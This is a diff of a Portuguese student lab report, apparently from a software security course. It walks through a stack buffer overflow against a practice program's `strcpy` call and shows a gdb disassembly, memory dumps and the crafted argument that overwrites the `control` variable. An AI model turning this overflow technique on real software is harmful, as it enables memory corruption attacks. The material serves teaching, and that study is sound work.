@@ -31,63 +31,86 @@ Após testar e executar o programa `ReadOverflow.c`, podemos concluir que, facil
 
 ## Pergunta P1.5
 
-```
-Dump of assembler code for function main:
-   0x0000000000001179 <+0>:     push   rbp
-   0x000000000000117a <+1>:     mov    rbp,rsp
-   0x000000000000117d <+4>:     sub    rsp,0x70
-   0x0000000000001181 <+8>:     mov    DWORD PTR [rbp-0x64],edi
-   0x0000000000001184 <+11>:    mov    QWORD PTR [rbp-0x70],rsi
-   0x0000000000001188 <+15>:    mov    rax,QWORD PTR fs:0x28
-   0x0000000000001191 <+24>:    mov    QWORD PTR [rbp-0x8],rax
-   0x0000000000001195 <+28>:    xor    eax,eax
-   0x0000000000001197 <+30>:    cmp    DWORD PTR [rbp-0x64],0x1
-   0x000000000000119b <+34>:    jne    0x11b3 <main+58>
-   0x000000000000119d <+36>:    lea    rsi,[rip+0xe64]        # 0x2008
-   0x00000000000011a4 <+43>:    mov    edi,0x1
-   0x00000000000011a9 <+48>:    mov    eax,0x0
-   0x00000000000011ae <+53>:    call   0x1060 <errx@plt>
-   0x00000000000011b3 <+58>:    lea    rdi,[rip+0xe6e]        # 0x2028
-   0x00000000000011ba <+65>:    call   0x1040 <puts@plt>
-   0x00000000000011bf <+70>:    mov    DWORD PTR [rbp-0x54],0x0 # control = 0
-   0x00000000000011c6 <+77>:    mov    rax,QWORD PTR [rbp-0x70]
-   0x00000000000011ca <+81>:    add    rax,0x8
-   0x00000000000011ce <+85>:    mov    rdx,QWORD PTR [rax]
-   0x00000000000011d1 <+88>:    lea    rax,[rbp-0x50]
-   0x00000000000011d5 <+92>:    mov    rsi,rdx
-   0x00000000000011d8 <+95>:    mov    rdi,rax
-   0x00000000000011db <+98>:    call   0x1030 <strcpy@plt>
-   0x00000000000011e0 <+103>:   cmp    DWORD PTR [rbp-0x54],0x61626364
-   0x00000000000011e7 <+110>:   jne    0x11f7 <main+126>
-   0x00000000000011e9 <+112>:   lea    rdi,[rip+0xe88]        # 0x2078
-   0x00000000000011f0 <+119>:   call   0x1040 <puts@plt>
-   0x00000000000011f5 <+124>:   jmp    0x120d <main+148>
-```
+Uma vez que a utilização da função `strcpy` não verifica os limites do argumento que serão copiados para o *buffer*, é possível explorar esta vulnerabilida com um **buffer overflow**, alterando o valor de endereços de memória adjacentes a ele.
+
+De seguida encontra-se o *dump* obtida da função `main`.
 
 ```
-(gdb) set disassembly-flavor intel
+Dump of assembler code for function main:
+   0x0000000000400608 <+0>:     push   %rbp
+   0x0000000000400609 <+1>:     mov    %rsp,%rbp
+   0x000000000040060c <+4>:     sub    $0x60,%rsp
+   0x0000000000400610 <+8>:     mov    %edi,-0x54(%rbp)
+   0x0000000000400613 <+11>:    mov    %rsi,-0x60(%rbp)
+   0x0000000000400617 <+15>:    cmpl   $0x1,-0x54(%rbp)
+   0x000000000040061b <+19>:    jne    0x400631 <main+41>
+   0x000000000040061d <+21>:    mov    $0x400780,%esi
+   0x0000000000400622 <+26>:    mov    $0x1,%edi
+   0x0000000000400627 <+31>:    mov    $0x0,%eax
+   0x000000000040062c <+36>:    callq  0x400490 <errx@plt>
+   0x0000000000400631 <+41>:    mov    $0x4007a0,%edi
+   0x0000000000400636 <+46>:    callq  0x400460 <puts@plt>
+   0x000000000040063b <+51>:    movl   $0x0,-0x4(%rbp)
+   0x0000000000400642 <+58>:    mov    -0x60(%rbp),%rax
+   0x0000000000400646 <+62>:    add    $0x8,%rax
+   0x000000000040064a <+66>:    mov    (%rax),%rdx
+   0x000000000040064d <+69>:    lea    -0x50(%rbp),%rax
+   0x0000000000400651 <+73>:    mov    %rdx,%rsi
+   0x0000000000400654 <+76>:    mov    %rax,%rdi
+   0x0000000000400657 <+79>:    callq  0x400480 <strcpy@plt>
+   0x000000000040065c <+84>:    cmpl   $0x61626364,-0x4(%rbp)
+   0x0000000000400663 <+91>:    jne    0x400671 <main+105>
+   0x0000000000400665 <+93>:    mov    $0x4007f0,%edi
+   0x000000000040066a <+98>:    callq  0x400460 <puts@plt>
+   0x000000000040066f <+103>:   jmp    0x400685 <main+125>
+   0x0000000000400671 <+105>:   mov    -0x4(%rbp),%eax
+   0x0000000000400674 <+108>:   mov    %eax,%esi
+   0x0000000000400676 <+110>:   mov    $0x400840,%edi
+   0x000000000040067b <+115>:   mov    $0x0,%eax
+   0x0000000000400680 <+120>:   callq  0x400450 <printf@plt>
+   0x0000000000400685 <+125>:   leaveq 
+   0x0000000000400686 <+126>:   retq   
+End of assembler dump.
+```
+
+Desta forma é possível identificar em que endereços são guardadas as variáveis locais, incluindo a variável `control`, que pretendemos alterar, e a variável `buffer`, que tentaremos explorar. Agora, serão apresentados os passos utilizados, para conseguir vizualizar a organização e conteúdo das variáveis em memória.
+
+```
 (gdb) define hook-stop
 Type commands for definition of "hook-stop".
 End with a line saying just "end".
->x/-24wx $rbp
->x/2i $rip
+>x/32wx $rbp-0x64
 >end
 (gdb) b 23
 Breakpoint 1 at 0x11e0: file 1-match.c, line 23.
-(gdb) r AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDdcba
-Starting program: /home/frodo/UM/4_Ano/2_Semestre/ES/G12/Aula11/bin/Aula11.a/1-match AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDdcba
+(gdb) r AAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEE
+Starting program: /home/a77070/test/1-match AAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEE
 You win this game if you can change variable control to the value 0x61626364'
-0x7fffffffe130: 0x000000c2      0x00000000      0xffffe166      0x00000000
-0x7fffffffe140: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe150: 0x42424242      0x42424242      0x42424242      0x42424242
-0x7fffffffe160: 0x43434343      0x43434343      0x43434343      0x43434343
-0x7fffffffe170: 0x44444444      0x44444444      0x44444444      0x44444444
-0x7fffffffe180: 0x61626364      0x00007f00      0x0db50400      0x0a239d94
-=> 0x5555555551e0 <main+103>:   cmp    DWORD PTR [rbp-0x54],0x61626364
-   0x5555555551e7 <main+110>:   jne    0x5555555551f7 <main+126>
+0x7fffffffdf4c: 0x00000000      0xffffe098      0x00007fff      0x004006a0
+0x7fffffffdf5c: 0x00000002      0x41414141      0x41414141      0x41414141
+0x7fffffffdf6c: 0x42424242      0x42424242      0x42424242      0x42424242
+0x7fffffffdf7c: 0x43434343      0x43434343      0x43434343      0x43434343
+0x7fffffffdf8c: 0x44444444      0x44444444      0x44444444      0x44444444
+0x7fffffffdf9c: 0x45454545      0x61626364      0x00007f00      0x00000000
+0x7fffffffdfac: 0x00000000      0x00000000      0x00000000      0x08a1ecdd
+0x7fffffffdfbc: 0x00000039      0x00000000      0x00000000      0xffffe098
 
-Breakpoint 1, main (argc=2, argv=0x7fffffffe278) at 1-match.c:23
-23        if(control == 0x61626364) {
+```
+A string usada como input foi escolhida de modo a facilitar a visuzalição da variável `buffer` em memória. É também possível verificar que a variável `control` encontra-se armazenada 4 bytes a seguir à variável `buffer`. Por isso, através do seguinte input, é possível alterar o valor desta variável para o valor exato que é pretendido, tendo em conta que a arquitetura do sistema é *little-endian*.
+
+```
+(gdb) r AAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEdcba
+Starting program: /home/a77070/test/1-match AAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEdcba
+You win this game if you can change variable control to the value 0x61626364'
+Congratulations, you win!!! You correctly got the variable to the right value
+0x7fffffffdf3c: 0x00000000      0xffffe088      0x00007fff      0x004006a0
+0x7fffffffdf4c: 0x00000002      0x41414141      0x41414141      0x41414141
+0x7fffffffdf5c: 0x42424242      0x42424242      0x42424242      0x42424242
+0x7fffffffdf6c: 0x43434343      0x43434343      0x43434343      0x43434343
+0x7fffffffdf7c: 0x44444444      0x44444444      0x44444444      0x44444444
+0x7fffffffdf8c: 0x45454545      0x45454545      0x45454545      0x45454545
+0x7fffffffdf9c: 0x61626364      0x00000000      0x00000000      0x08a1ecdd
+0x7fffffffdfac: 0x00000039      0x00000000      0x00000000      0xffffe088
 ```
 
 ## Pergunta P2.1
